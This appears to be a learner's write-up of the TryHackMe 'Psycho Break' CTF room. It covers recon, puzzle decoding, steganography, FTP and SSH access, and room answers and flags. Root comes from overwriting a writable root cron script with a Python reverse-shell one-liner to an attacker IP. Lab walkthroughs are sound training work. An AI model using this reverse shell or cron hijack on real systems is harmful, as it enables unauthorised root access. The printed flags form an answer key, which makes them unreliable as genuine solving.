<h1 align="center">Psycho Break</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/6871723c-5d0a-4b68-b531-ee6aa08fccd5"><br>
2025, September 5<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>487</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Help Sebastian and his team of investigators to withstand the dangers that come ahead.</em>.<br>
Access it <a href="https://tryhackme.com/room/psychobreak">here</a><br>
<img width="1200px" src="https://github.com/user-attachments/assets/4007071f-fda1-4fea-b49a-764b198b7c05"></p>


<h1>Task 1 .Recon</h1>
<p>This room is based on a video game called evil within. I am a huge fan of this game. So I decided to make a CTF on it. With my storyline :). Your job is to help Sebastian and his team of investigators to withstand the dangers that come ahead.

[Hints are provided as you progress through the challenge]<br>

The VM might take up to 2-3 minutes to fully boot up.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. Deploy the machine<br>
<code>No answer needed</code></p>

<p>1.2. How many ports are open?<br>
<code>3</code></p>

<p>1.3. What is the operating system that runs on the target machine?<br>
<code>ubuntu</code></p>


<h2>nmap</h2>

```bash
# nmap -sT xx.xxx.xx.xx
...
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

<h2>Task 2 . Web</h2>
<p>Here comes the web.</p>

<p><em>Answer the questions below</em></p>

<h2>port 80</h2>

<img width="1113" height="440" alt="image" src="https://github.com/user-attachments/assets/c9cd8858-d365-4902-af98-1d6bf4a72c6f" />

<br>

<img width="1123" height="317" alt="image" src="https://github.com/user-attachments/assets/598e38f9-258b-4a1d-b5e4-58d616d234b2" />

<br>
<h2>/sadistRoom/</h2>
<p>Key to locker Room => 532219a04ab7a02b56faafbec1a4c1ea</p>

<img width="1114" height="501" alt="image" src="https://github.com/user-attachments/assets/d622093c-5891-4310-b0e2-3c395c7c8f68" />

<br>
<h2>lockerRoom</h2>

<p>Decode this piece of text "Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv" and get the key to access the map</p>

<img width="1124" height="561" alt="image" src="https://github.com/user-attachments/assets/6b66c97d-4e5b-4c41-9744-ddaf815f2f01" />

<h4>www.guballa.de/vigenere-solver</h4>h4>
<p>
  
- Grant_me_access_to_the_map_please</p>

<img width="418" height="525" alt="image" src="https://github.com/user-attachments/assets/62a016e2-57ef-4223-89c4-2153cb42ba1a" />

<br>
<h2>/SafeHeaven/</h2>

<img width="1116" height="565" alt="image" src="https://github.com/user-attachments/assets/6fe1f35f-1f2d-40a5-872b-a39fe0bc6e84" />

<br>
<h2>gobuster</h2>

```bash
# gobuster dir -u http://xx.xxx.xx.xx/SafeHeaven/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/imgs                 (Status: 301) [Size: 322] [--> http://xx.xxx.xx.xx/SafeHeaven/imgs/]
/keeper               (Status: 301) [Size: 324] [--> http://xx.xxx.xx.xx/SafeHeaven/keeper/]
```

<h2>/SafeHeaven/keeper</h2>

<img width="1116" height="493" alt="image" src="https://github.com/user-attachments/assets/a60403a6-f5e5-4403-b2ab-96e68a153165" />

<br>
<p>Escape Keeper</p>

<img width="1122" height="496" alt="image" src="https://github.com/user-attachments/assets/f02c4b06-e361-4376-bdf8-0577ac4458d8" />

<br>
<h4>Yandex</h4>
<p>St. Augustine lighthouse</p>

<img width="1112" height="522" alt="image" src="https://github.com/user-attachments/assets/a5c25560-69c4-4ba0-8bcb-c2180a606bef" />

<br>

<img width="1113" height="530" alt="image" src="https://github.com/user-attachments/assets/0305d46c-38a2-4328-8005-d0012c1fa5d0" />

<br>

<img width="1122" height="190" alt="image" src="https://github.com/user-attachments/assets/e43a6583-d208-4205-a3e1-4b2f5c84179d" />

<p>
  
-Here is your key : 48ee41458eb0b43bf82b986cecf3af01</p>

<h2>/adondonedRoom/</h2>

<img width="1090" height="86" alt="image" src="https://github.com/user-attachments/assets/5edf5565-bd61-4b22-af89-110796ccaf6f" />

<br>

<img width="1116" height="681" alt="image" src="https://github.com/user-attachments/assets/6506322b-2b76-4135-ad5b-d43b85ea0e4e" />

<br>

<img width="1108" height="423" alt="image" src="https://github.com/user-attachments/assets/cef4e5e6-0e73-47fa-ab2a-abce4e8dce99" />

<br>

<img width="1128" height="169" alt="image" src="https://github.com/user-attachments/assets/9b676e92-79d6-45a7-b0e2-b95ddb613ec2" />

<br>
<h2>/abandonedRoom/680e89809965ec41e64dc7e447f175ab/</h2>

<img width="1087" height="158" alt="image" src="https://github.com/user-attachments/assets/27cbf420-aa7c-4d20-be49-db8023b87939" />

<br>
<h2>abandonedRoom/680e89809965ec41e64dc7e447f175ab/you_made_it.txt</h2>

<img width="654" height="58" alt="image" src="https://github.com/user-attachments/assets/3299f18f-8b5f-4c0e-9cd4-c44206eb7386" />

<br>
<p><em>Answer the questions below</em></p>

<p>2.1. Key to the looker room<br>
<code>532219a04ab7a02b56faafbec1a4c1ea</code></p>

<p>2.2. Key to access the map<br>
<code>Grant_me_access_to_the_map_please</code></p>

<p>2.3. The Keeper Key<br>
<code>48ee41458eb0b43bf82b986cecf3af01</code></p>

<p>2.4. What is the filename of the text file (without the file extension)<br>
<code>you_made_it</code></p>

<br>
<h2>Task 3 . Help Mee</h2>
<p>Get that poor soul out of the cell.</p>

<p><em>Answer the questions below</em></p>

<p>3.1. Who is locked up in the cell?<br>
<code>Joseph</code></p>


<img width="417" height="63" alt="image" src="https://github.com/user-attachments/assets/0d0781a4-6a67-4add-992a-45e39b0529cb" />

<br>

<img width="733" height="185" alt="image" src="https://github.com/user-attachments/assets/eb588fa5-9865-49d5-9093-40ee589439bf" />

<br>

<img width="520" height="159" alt="image" src="https://github.com/user-attachments/assets/4b9890c8-0e08-4851-8614-ca9121609316" />

<br><p>3.2. There is something weird with the .wav file. What does it say?<br>
<code>SHOWME</code></p>

```bash
:~/helpme# file Table.jpg
Table.jpg: Zip archive data, at least v2.0 to extract
```

```bash
:~/helpme# mv Table.jpg Table.zip
```

```bash
:~/helpme# unzip Table.zip
Archive:  Table.zip
  inflating: Joseph_Oda.jpg          
  inflating: key.wav                 
```

<p>
  
- morsecode.world</p>

```bash
:~/helpme# steghide extract -sf Joseph_Oda.jpg
Enter passphrase: 
wrote extracted data to "thankyou.txt".
```

```bash
:~/helpme# cat thankyou.txt
```

<br>
<p>3.3. What is the FTP username<br>
<code>joseph</code></p>

<br>
<p>3.4. What is the FTP User password<br>
<code>intotheterror445</code></p>

```bash
From joseph,

Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help 
Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate. 
But for some reason there is my name listed on the note which I don't have a clue.

	   --------------------------------------------
        //						\\
	||	(NOTE) FTP Details			||
	||      ==================			||
	||						||
	||	USER : joseph				||
	||	PASSWORD : intotheterror445		||
	||						||
	\\						//
	   --------------------------------------------
	

Good luck, Be carefull !!!
```

<br>
<h2>Task 4 . Help Mee</h2>
<p>Brute Brute Brute.</p>

<p><em>Answer the questions below</em></p>

<p>4.1. The key used by the program<br>
<code>kidman</code></p>

```bash
:~/helpme# ftp xx.xxx.xx.xx
Connected to xx.xxx.xx.xx.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:xx.xxx.xx.xx]
Name (xx.xxx.xx.xx:root): joseph
331 Password required for joseph
Password:
230 User joseph logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 0        0            4.0k Aug 13  2020 .
drwxr-xr-x   2 0        0            4.0k Aug 13  2020 ..
-rwxr-xr-x   1 joseph   joseph      11.1M Aug 13  2020 program
-rw-r--r--   1 joseph   joseph        974 Aug 13  2020 random.dic
226 Transfer complete
ftp> mget program
mget program? y
200 PORT command successful
150 Opening BINARY mode data connection for program (11641688 bytes)
226 Transfer complete
11641688 bytes received in 0.09 secs (119.6184 MB/s)
ftp> mget random.dic
mget random.dic? y
200 PORT command successful
150 Opening BINARY mode data connection for random.dic (974 bytes)
226 Transfer complete
974 bytes received in 0.00 secs (895.6420 kB/s)
ftp> bye
221 Goodbye.
```

```bash
:~/helpme# file program
program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped
```

```bash
:~/helpme# file random.dic
random.dic: ASCII text, with CRLF line terminators
```

```bash
:~/helpme# chmod +x program
3:~/helpme# ./program
[+] Usage
./program <word>
:~/helpme# strings random.dic > words.txt
:~/helpme# while read line; do ./program "$line"; done <words.txt
000000 => Incorrect

111111 => Incorrect

...
kidman => Correct

Well Done !!!
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
```

<br>
<p>4.2. What do the crazy long numbers mean when there decrypted.<br>
<code>KIDMANSPASSWORDISSOSTRANGE</code></p>

<p>

- https://www.cachesleuth.com/vanity.html</p>


<img width="1086" height="513" alt="image" src="https://github.com/user-attachments/assets/7b407ca0-ae6c-4227-87d9-6703720e7371" />

<br>
<h2>Task 5 . Go Capture the Flag</h2>
<p>>> Root Me <<</p>

<p><em>Answer the questions below</em></p>

<p>5.1. user.txt<br>
<code>4C72A4EF8E6FED69C72B4D58431C4254</code></p>

```bash
:~/helpme# ssh kidman@xx.xxx.xx.xx
...
kidman@xx.xxx.xx.xx's password: 
...
kidman@evilwithin:~$ pwd
/home/kidman/
kidman@evilwithin:~$ ls
user.txt
kidman@evilwithin:~$ cat user.txt
4C72A4EF8E6FED69C72B4D58431C4254
kidman@evilwithin:~$ 
```

<br>
<p>5.2. root.txt<br>
<code>BA33BDF5B8A3BFC431322F7D13F3361E</code></p>

```bash
kidman@evilwithin:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root       921  0.0  0.2  29008  3032 ?        Ss   20:45   0:00 /usr/sbin/cron -f
...
```

```bash
kidman@evilwithin:/etc$ cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
```


```bash
kidman@evilwithin:/var$ ls -lah
total 64K
drwxr-xr-x 15 root root   4.0K Jul 22  2020 .
drwxr-xr-x 23 root root   4.0K Jul 14  2020 ..
drwxr-xr-x  2 root root   4.0K Aug 13  2020 backups
drwxr-xr-x  9 root root   4.0K Jul 14  2020 cache
drwxrwxrwt  2 root root   4.0K Aug 14  2020 crash
drwxr-xr-x  2 root root   4.0K Aug 13  2020 ftp
drwxr-xr-x 42 root root   4.0K Jul 14  2020 lib
drwxrwsr-x  2 root staff  4.0K Jul 14  2020 local
lrwxrwxrwx  1 root root      9 Jul  7  2020 lock -> /run/lock
drwxrwxr-x 10 root syslog 4.0K Jul 14  2020 log
drwxrwsr-x  2 root mail   4.0K Jul 14  2020 mail
drwxr-xr-x  2 root root   4.0K Jul 14  2020 opt
lrwxrwxrwx  1 root root      4 Jul  7  2020 run -> /run
drwxr-xr-x  2 root root   4.0K Jul 14  2020 snap
drwxr-xr-x  4 root root   4.0K Jul 14  2020 spool
-rwxr-xrw-  1 root root    300 Aug 14  2020 .the_eye_of_ruvik.py
drwxrwxrwt 11 root root   4.0K Sep  5 20:43 tmp
drwxr-xr-x  3 root root   4.0K Jul 14  2020 www
```

```bash
kidman@evilwithin:/var$ cat .the_eye_of_ruvik.py
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)
```

```bash
kidman@evilwithin:/home/kidman$ echo -n 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xx.xx",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' > /var/.the_eye_of_ruvik.py
```

```bash
kidman@evilwithin:/home/kidman$ ls /var
backups  cache  crash  ftp  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
```

```bash
kidman@evilwithin:/home/kidman$ ls -lah /var
total 64K
drwxr-xr-x 15 root root   4.0K Jul 22  2020 .
drwxr-xr-x 23 root root   4.0K Jul 14  2020 ..
drwxr-xr-x  2 root root   4.0K Aug 13  2020 backups
drwxr-xr-x  9 root root   4.0K Jul 14  2020 cache
drwxrwxrwt  2 root root   4.0K Aug 14  2020 crash
drwxr-xr-x  2 root root   4.0K Aug 13  2020 ftp
drwxr-xr-x 42 root root   4.0K Jul 14  2020 lib
drwxrwsr-x  2 root staff  4.0K Jul 14  2020 local
lrwxrwxrwx  1 root root      9 Jul  7  2020 lock -> /run/lock
drwxrwxr-x 10 root syslog 4.0K Jul 14  2020 log
drwxrwsr-x  2 root mail   4.0K Jul 14  2020 mail
drwxr-xr-x  2 root root   4.0K Jul 14  2020 opt
lrwxrwxrwx  1 root root      4 Jul  7  2020 run -> /run
drwxr-xr-x  2 root root   4.0K Jul 14  2020 snap
drwxr-xr-x  4 root root   4.0K Jul 14  2020 spool
-rwxr-xrw-  1 root root    207 Sep  5 21:57 .the_eye_of_ruvik.py
drwxrwxrwt 11 root root   4.0K Sep  5 20:43 tmp
drwxr-xr-x  3 root root   4.0K Jul 14  2020 www
```

```bash
kidman@evilwithin:/home/kidman$ cat /var/.the_eye_of_ruvik.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xx.xx",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")kidman@evilwithin:/home/kidman$ 
```

```bash
:~/helpme# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on xx.xxx.xx.xx 53848
# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@evilwithin:~# ^Z
[1]+  Stopped                 nc -nlvp 9001
:~/helpme# stty raw -echo; fg
nc -nlvp 9001

root@evilwithin:~# export TERM=xterm
```

```bash
root@evilwithin:~# pwd
/root
```

```bash
root@evilwithin:~# ls
readMe.txt  root.txt
```

```bash
root@evilwithin:~# cat root.txt
BA33BDF5B8A3BFC431322F7D13F3361E
```

```bash
root@evilwithin:~# cat readMe.txt


 /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
|  From Sebastian :									|
|											|
|  You have one final task ... Help me to defeat ruvik !!!				|
|											|
 \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
```

<p>5.3. [Bonus] Defeat Ruvik<br>
<code>No answer neede</code></p>


```bash
root@evilwithin:/home# deluser ruvik
Removing user `ruvik' ...
Warning: group `ruvik' has no more members.
Done.
```

<h2>Task 6 . Copyright material</h2>

<p>The images used in this CTF are obtained from:<br>

1. The Fandom wiki under CC-BY-SA license.<br>

2. User Wordridden at flickr.com under cc by 2.0 license.</p>


<p><em>Answer the questions below</em></p>

<p>6.1. Congratulations you've complete the evil-within. This is the first room I've ever created so If you enjoyed it please give me a follow up on twitter (https://twitter.com/ShalindaFdo) and send me your feedback :).<br>
<code>No answer needed</code></p>

<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d758fcf6-0256-47fd-9acc-b7c1b817eb83"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/0a8cf525-9210-4c23-ba68-6163f4b3eb2f"></p>

<h2 align="center">My TryHackMe Journey</h2>

<div align="center">

| Date              | Room                  |Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :--------------- | :-------------------  |  :------:|:----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                       |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, Sep 5       |Easy 🔗 - Psycho Break | 487      |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    941    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel|486|	113ʳᵈ|	5ᵗʰ	|579ᵗʰ|	10ᵗʰ|	124,018|	940	|73|
| 2025, Sep 4       |Medium 🚩 - Cold VVars | 486      |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 4       |Easy 🔗 - Malware Classification | 485     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |

</div>


<p align="center">Global All Time:   113ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/f39f20c4-3417-4d45-92ef-8e971f5c7da0"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/c6237b9d-d65c-45d1-bc1e-cc49b4d48780"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/e06e8b02-1ac4-4cca-87e5-d6ea52fd63bb"><br>
                  Global monthly:    724ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7dc69b33-6c5f-40ff-ae6b-057a438383dd"><br>
                  Brazil monthly:     10ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/785e2d51-f8f3-4938-8569-3123194e6d6d"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
